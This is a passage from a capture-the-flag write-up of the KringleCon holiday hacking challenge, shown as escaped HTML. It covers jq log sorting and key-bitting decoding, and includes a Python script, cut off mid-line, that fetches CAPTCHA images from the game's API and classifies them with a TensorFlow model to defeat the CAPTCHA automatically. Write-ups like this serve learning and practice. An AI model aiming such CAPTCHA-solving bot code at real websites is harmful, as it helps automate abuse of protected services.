&lt;span class="nv"&gt;cat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;conn&lt;/span&gt;.&lt;span class="nv"&gt;log&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nv"&gt;jq&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;c&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sort_by(.duration)&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;sorted&lt;/span&gt;
&lt;span class="nv"&gt;cat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;sorted&lt;/span&gt;#...&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;took&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;forever&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;then&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;just&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;looked&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;at&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;bottom&lt;/span&gt;:
&lt;span class="w"&gt;                                                                                                                       &lt;/span&gt;{&lt;span class="s2"&gt;&amp;quot;ts&amp;quot;&lt;/span&gt;:&lt;span class="err"&gt;&amp;quot;2019-0&lt;/span&gt;
&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="nv"&gt;T21&lt;/span&gt;:&lt;span class="mi"&gt;27&lt;/span&gt;:&lt;span class="mi"&gt;45&lt;/span&gt;.&lt;span class="mi"&gt;402479&lt;/span&gt;&lt;span class="nv"&gt;Z&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;,&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;CmYAZn10sInxVD5WWd&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;,&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;id&lt;/span&gt;.&lt;span class="nv"&gt;orig_h&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:&amp;quot;&lt;/span&gt;&lt;span class="mi"&gt;192&lt;/span&gt;.&lt;span class="mi"&gt;168&lt;/span&gt;.&lt;span class="mi"&gt;52&lt;/span&gt;.&lt;span class="mi"&gt;132&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;,&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;id&lt;/span&gt;.&lt;span class="nv"&gt;orig_p&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:8,&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;id&lt;/span&gt;.&lt;span class="nv"&gt;r&lt;/span&gt;&lt;span class="w"&gt;                     &lt;/span&gt;&lt;span class="nv"&gt;esp_h&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:&amp;quot;&lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt;.&lt;span class="mi"&gt;107&lt;/span&gt;.&lt;span class="mi"&gt;21&lt;/span&gt;.&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;,&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;id&lt;/span&gt;.&lt;span class="nv"&gt;resp_p&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:0,&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;proto&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;icmp&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;,&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;duration&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:1019365.337758,&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;orig_bytes&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:3078192                     0,&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;resp_bytes&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:30382240,&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;conn_state&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;OTH&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;,&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;missed_bytes&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:0,&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;orig_pkts&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:961935,&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;orig_ip_bytes&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:577                     16100,&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;resp_pkts&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:949445,&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;resp_ip_bytes&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;:56966700}]   &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Finishing each challenge gives some tips to some other challenges. There was a hint to the Sled Route API suggesting to use jq. And there was another that if you beat the Trail Game on Hard there's more hints? Also beating the lock game in under 3 minutes is another hint I think..&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Next one I managed was the key bitting one to get into the Steam Tunnels! There was a good talk on this topic with a link to &lt;a href="https://github.com/deviantollam/decoding"&gt;https://github.com/deviantollam/decoding&lt;/a&gt; and then just used that and tried maybe 5 keys before finding the right now. GIMP is not my specialty but the decoders helped a bit. The image of the key was not discoverable until one got into the Sleigh Shop.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="image-ai"&gt;Image AI&lt;/h2&gt;
&lt;p&gt;And then we get to the CAPTCHA + tensorflow madness! This was real fun, haven't had to do much with tensorflow before. Did not have to read much at all about tensorflow to get this going, could basically just glue together the provided python scripts.&lt;/p&gt;
&lt;p&gt;Another very good kringlecon talk on this topic: &lt;a href="https://www.youtube.com/watch?v=jmVPLwjm_zs&amp;amp;feature=youtu.be"&gt;https://www.youtube.com/watch?v=jmVPLwjm_zs&amp;amp;feature=youtu.be&lt;/a&gt; led to a github repo. Some other code and training images were found as soon as one got far enough into the Steam Tunnels. I managed to after not too much googling get the python script to store the images in teh CAPTEHA in a directory and then run the predict tensorflow python script on the github repo against it. It was however too slow. Fortunately I had access to a machine with lots of cores so moving all the data there and re-running the python got it working for me. 2 oversubscribed cores and 2GB RAM was too little. 80 dedicated single server skylake cores and 356GB RAM completed it much faster. There were messages about tensorflow from pip not having been compiled with all the things enabled. I could I suppose also have tried this with a GPU :) And the PYTHON:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;span class="c1"&gt;# Fridosleigh.com CAPTEHA API - Made by Krampus Hollyfeld&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;json&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;shutil&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;

&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;TF_CPP_MIN_LOG_LEVEL&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;tensorflow&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nn"&gt;tf&lt;/span&gt;
&lt;span class="n"&gt;tf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;logging&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_verbosity&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;logging&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ERROR&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;numpy&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nn"&gt;np&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;threading&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;queue&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;load_labels&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;label_file&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;label&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
    &lt;span class="n"&gt;proto_as_ascii_lines&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gfile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;label_file&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readlines&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;proto_as_ascii_lines&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;label&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rstrip&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;label&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;predict_image&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sess&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;graph&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;image_bytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;img_full_path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;labels&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;input_operation&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;output_operation&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;image&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;read_tensor_from_image_bytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;image_bytes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;results&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;output_operation&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;outputs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;input_operation&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;outputs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="n"&gt;image&lt;/span&gt;
    &lt;span class="p"&gt;})&lt;/span&gt;
    &lt;span class="n"&gt;results&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;squeeze&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;results&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;prediction&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;results&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argsort&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;:][::&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;put&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;img_full_path&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;img_full_path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;prediction&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;labels&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;prediction&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;percent&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;results&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;prediction&lt;/span&gt;&lt;span class="p"&gt;]}&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;load_graph&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;model_file&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;graph&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Graph&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;graph_def&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GraphDef&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;model_file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;rb&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;graph_def&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ParseFromString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;graph&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;as_default&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
        &lt;span class="n"&gt;tf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;import_graph_def&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;graph_def&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;graph&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;read_tensor_from_image_bytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;imagebytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;input_height&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;299&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;input_width&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;299&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;input_mean&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;input_std&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;255&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;image_reader&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode_png&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;imagebytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;channels&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;png_reader&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;float_caster&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cast&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;image_reader&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;tf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;float32&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;dims_expander&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;expand_dims&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;float_caster&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;resized&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;resize_bilinear&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dims_expander&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;input_height&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;input_width&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="n"&gt;normalized&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;divide&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;subtract&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;resized&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;input_mean&lt;/span&gt;&lt;span class="p"&gt;]),&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;input_std&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="n"&gt;sess&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;compat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;v1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Session&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;normalized&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;

&lt;span class="c1"&gt;# above is from predict_images_using_trained_model.py because python and import meh&lt;/span&gt;

&lt;span class="c1"&gt;###########&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;yourREALemailAddress&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;MYREALEmAEL@example.org&amp;quot;&lt;/span&gt;

    &lt;span class="c1"&gt;# Creating a session to handle cookies&lt;/span&gt;
    &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Session&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;https://fridosleigh.com/&amp;quot;&lt;/span&gt;

    &lt;span class="n"&gt;json_resp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;{}&lt;/span&gt;&lt;span class="s2"&gt;api/capteha/request&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;b64_images&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json_resp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;images&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;                    &lt;span class="c1"&gt;# A list of dictionaries eaching containing the keys &amp;#39;base64&amp;#39; and &amp;#39;uuid&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;challenge_image_type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json_resp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;select_type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;     &lt;span class="c1"&gt;# The Image types the CAPTEHA Challenge is looking for.&lt;/span&gt;
    &lt;span class="n"&gt;challenge_image_types&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;challenge_image_type&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;challenge_image_type&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;challenge_image_type&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span 